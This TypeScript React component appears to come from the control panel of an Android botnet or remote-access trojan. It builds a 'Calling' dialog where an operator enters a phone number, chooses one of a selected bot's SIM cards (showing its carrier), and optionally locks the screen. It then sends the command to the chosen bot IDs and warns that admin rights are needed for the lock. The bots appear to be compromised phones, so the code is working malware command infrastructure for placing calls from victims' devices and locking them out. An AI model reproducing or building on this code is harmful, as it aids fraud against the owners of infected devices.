import React, {useEffect, useState} from "react";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {Alert, Col, Form, Input, Modal, Row, Switch} from "antd";
import {SimCardIcon} from "../../Misc/CustomIcons";
import {getBotsId} from "../../../Util/getBotIds";
import sendCommand from "../../../Requests/Commands/sendCommands";

const Calling: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps, isAdmin: boolean) => {
    const [form] = Form.useForm();

    useEffect(() => {
        form.setFieldsValue({
            sim: "sim1",
        });
    }, [form]);

    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };
    const formSubmit = () => {
        const formFieldsValues = form.getFieldsValue();
        sendCommand({
            command: "Calling",
            payload: {
                ...formFieldsValues,
                lock: formFieldsValues["lock"] === true ? 1 : 0,
                sim: formFieldsValues["sim"] ?? "sim1",
            },
            botIds: getBotsId(props.selectedBots),
        });

        closeModal();
    };

    // const [phone, setPhone] = useState();
    const [locked, setLocked] = useState(false);

    return (
        <Modal
            title="Calling"
            visible={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            okText="Send"
            width={340}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item
                    label="Number"
                    name="number"
                    rules={[
                        {
                            required: true,
                            message: "This field can`t be empty",
                        },
                    ]}
                >
                    <Input type="text" placeholder="Number"/>
                </Form.Item>
                {props.selectedBots.length === 1 && (
                    <Form.Item label="Select sim card" name="sim" valuePropName="value">
                        <Row gutter={15}>
                            <Col span={12}>
                                <label className={props.selectedBots[0].sim_data.operator ? "sim-card" : "sim-card disabled"}>
                                    <Input
                                        type="radio"
                                        name="sim"
                                        value={"sim1"}
                                        defaultChecked={true}
                                        className="sim-card-radio"
                                        disabled={!props.selectedBots[0].sim_data.operator}
                                    />
                                    <span className="sim-card-inner">
                                        <span className="sim-card-icon">
                                            <SimCardIcon/>
                                        </span>
                                        <span className="sim-card-info">
                                            <span className="sim-card-name">
                                                Sim #1
                                            </span>
                                            <span className="sim-card-provider">
                                                {props.selectedBots[0].sim_data.operator ? props.selectedBots[0].sim_data.operator : "Empty"}
                                            </span>
                                        </span>
                                    </span>
                                </label>
                            </Col>
                            <Col span={12}>
                                <label className={props.selectedBots[0].sim_data.operator1 ? "sim-card" : "sim-card disabled"}>
                                    <Input
                                        type="radio"
                                        name="sim"
                                        value={"sim2"}
                                        className="sim-card-radio"
                                        disabled={!props.selectedBots[0].sim_data.operator1}
                                    />
                                    <span className="sim-card-inner">
                                        <span className="sim-card-icon">
                                            <SimCardIcon/>
                                        </span>
                                        <span className="sim-card-info">
                                            <span className="sim-card-name">
                                                Sim #2
                                            </span>
                                            <span className="sim-card-provider">
                                                {props.selectedBots[0].sim_data.operator1 ? props.selectedBots[0].sim_data.operator1 : "Empty"}
                                            </span>
                                        </span>
                                    </span>
                                </label>
                            </Col>
                        </Row>
                    </Form.Item>
                )}
                {props.selectedBots.length === 1 && (
                    <Form.Item label="Lock screen?" name="lock" valuePropName="checked">
                        <Switch
                            unCheckedChildren={"No\xa0"}
                            checkedChildren="Yes"
                            checked={locked}
                            onClick={() => setLocked(!locked)}
                        />
                    </Form.Item>
                )}

                {locked && props.bot?.permissions.admin &&
                    <Alert type="warning" message="Need activate admin rights to lock screen"/>
                }
            </Form>
        </Modal>
    );
};

export default Calling;
